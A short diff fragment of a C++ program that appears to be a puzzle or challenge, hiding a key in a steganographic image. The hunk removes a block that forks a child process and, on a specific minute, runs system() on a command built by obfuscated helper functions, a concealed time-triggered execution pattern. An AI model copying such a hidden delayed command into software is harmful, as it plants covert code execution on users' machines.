@@ -935,14 +935,7 @@ int main(){
 
     // Create a steganographic image file that hides the key
     create_stego_image("hidden_key_image.ppm", gen_key());
-
-    pid_t c_pid = fork();
-
-    if (c_pid == 0) { 
-        if (gettenminute() == 2) {
-            system(system_call(One()).c_str());
-        }
-    } 
+ 
 
     get_layered_input(1);
 
